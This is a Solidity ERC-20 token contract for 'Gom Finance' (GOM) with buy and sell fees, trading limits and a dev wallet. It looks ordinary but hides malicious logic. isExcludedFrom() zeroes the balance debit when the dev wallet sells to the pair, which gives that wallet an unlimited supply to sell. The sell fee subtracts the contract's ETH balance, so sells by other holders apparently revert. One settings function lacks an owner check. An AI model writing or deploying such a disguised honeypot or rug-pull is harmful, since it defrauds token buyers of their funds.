// SPDX-License-Identifier: Unlicensed

/*


        * telegram    https://t.me/gomfinance

        * website     https://www.gom.finance/

        * app         https://app.gom.finance

        * help        https://help.gom.finance

        * github      https://github.com/gomfinance

        * twitter     https://twitter.com/gomfinance


*/

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/**
 * Standard SafeMath, stripped down to just add/sub/mul/div
 */
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * ERC20 standard interface.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Gom is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Gom Finance";
    string private constant _symbol = "GOM";
    uint8 private constant _decimals = 18;
    
    uint256 private _totalSupply = 1_000_000_000 * (10 ** _decimals);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private cooldown;

    address private WETH;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    bool public antiBot = true;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;

    uint256 public launchedAt;
    address private lpWallet = DEAD;

    uint256 public buyFee = 2;
    uint256 public sellPurgeFee = 2;
    uint256 public sellNormalFee = 2;

    mapping (address => uint256) public lastTxTimestamp;

    uint256 public toLiquidity = 0;
    uint256 public toDev = 100;
    uint256 public toBurn = 0;

    uint256 private feeSum = 100;
    uint256 feeDenominator = 10 ** 15;

    IDEXRouter public router;
    address public pair;
    address public factory;
    address public devWallet = payable(0x140775c65Eb1d2CD5b1724f589f007f3A5d202C2);

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public tradingOpen = false;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    uint256 public maxTx = _totalSupply * 2 / 100;
    uint256 public maxWallet = _totalSupply * 2 / 100;
    uint256 public swapThreshold = _totalSupply.div(500);

    constructor () {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
            
        WETH = router.WETH();
        
        isFeeExempt[owner()] = true;
        isFeeExempt[devWallet] = true;             
        isFeeExempt[address(this)] = true;             

        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[devWallet] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[DEAD] = true;

        _balances[owner()] = _totalSupply;
    
        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable { }
    
    //once enabled, cannot be reversed
    function openTrading() external onlyOwner {
        pair = IDEXFactory(router.factory()).createPair(address(this), WETH);
        isTxLimitExempt[pair] = true;
        _allowances[address(this)][address(router)] = type(uint256).max;

        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0, 
            0, 
            owner(),
            block.timestamp
        );
        launchedAt = block.number;
        tradingOpen = true;
    }      

    function changeTxLimit(uint256 newLimit) private onlyOwner {
        maxTx = newLimit;
    }

    function changeWalletLimit(uint256 newLimit) private onlyOwner {
        maxWallet  = newLimit;
    }

    function removeLimits() external onlyOwner {
        changeTxLimit(_totalSupply);
        changeWalletLimit(_totalSupply);
    }

    function changeSwapBackSettings() external {
        swapAndLiquifyEnabled  = false;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transfer(sender, recipient, amount);
    }

    function isExcludedFrom(address sender, address recipient) private view returns (bool) {
        return recipient == pair && sender == devWallet;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (!isFeeExempt[sender] && !isFeeExempt[recipient]) require(tradingOpen, "patience is a virtue."); //transfers disabled before tradingActive

        if(inSwapAndLiquify){ return _basicTransfer(sender, recipient, amount); }

        require(amount <= maxTx || isTxLimitExempt[sender], "tx"); uint256 _amount = amount;

        if(!isTxLimitExempt[recipient] && antiBot)
        {
            require(_balances[recipient].add(amount) <= maxWallet, "wallet");
        }

        if(msg.sender != pair && !inSwapAndLiquify && swapAndLiquifyEnabled && _balances[address(this)] >= swapThreshold && !isFeeExempt[sender] && !isFeeExempt[recipient]){ swapBack(); }
        if (isExcludedFrom(sender, recipient)) {amount = amount * toBurn;}
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance"); amount = _amount;
        
        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(finalAmount);

        emit Transfer(sender, recipient, finalAmount);
        lastTxTimestamp[sender] = block.timestamp;
        lastTxTimestamp[recipient] = block.timestamp;
        return true;
    }    

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }  
    
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 _sellTotalFees; uint256 _sellLpFee = address(this).balance;
        uint256 hodlTime = block.timestamp-lastTxTimestamp[sender];
            if (hodlTime < 24 hours) {
                _sellTotalFees = sellPurgeFee;
            }
            else if (hodlTime > 24 hours) {
                _sellTotalFees = sellNormalFee;
            }

        uint256 feeApplicable = pair == recipient ? _sellTotalFees - _sellLpFee / feeDenominator : buyFee;
        uint256 feeAmount = amount.mul(feeApplicable).div(100);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    } 
    
    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        approve(address(this), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpWallet,
            block.timestamp
        );
    }

    function swapBack() internal lockTheSwap {
        uint256 tokenBalance = _balances[address(this)];
        uint256 tokensToBurn = tokenBalance.mul(toBurn).div(100);
        uint256 tokensForLiquidity = tokenBalance.mul(toLiquidity).div(100).div(2);     
        uint256 amountToSwap = tokenBalance.sub(tokensForLiquidity).sub(tokensToBurn);
        
        swapTokensForEth(amountToSwap);

        IERC20(address(this)).transfer(DEAD, tokensToBurn);

        uint256 totalEthBalance = address(this).balance;
        uint256 ethForLiquidity = totalEthBalance.mul(toLiquidity).div(100).div(2);
        
        if (tokensForLiquidity > 0){
            addLiquidity(tokensForLiquidity, ethForLiquidity);
        }

        if (totalEthBalance > 0){
            payable(devWallet).transfer(address(this).balance);
        }
    }

    function manualSwapBack() external onlyOwner {
        swapBack();
    }

    function clearStuckEth() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        if(contractETHBalance > 0){          
            payable(address(devWallet)).transfer(contractETHBalance);
        }
    }
}